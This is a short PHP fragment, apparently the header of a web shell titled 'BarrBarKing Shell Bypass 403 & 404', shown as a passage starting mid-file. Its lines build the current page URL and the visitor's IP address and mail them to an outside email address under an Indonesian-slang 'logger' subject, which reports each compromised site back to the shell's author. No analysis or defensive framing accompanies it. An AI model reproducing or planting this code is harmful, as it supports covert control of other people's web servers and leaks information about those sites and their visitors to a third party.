...
$to = 'ressultku2612@yahoo.com';
$path = "https://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($to, "ASiiikkkk dapet Logger | Jay Ganteng Banget", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
define("self", "./BarrBarKing Shell Bypass 403 & 404");
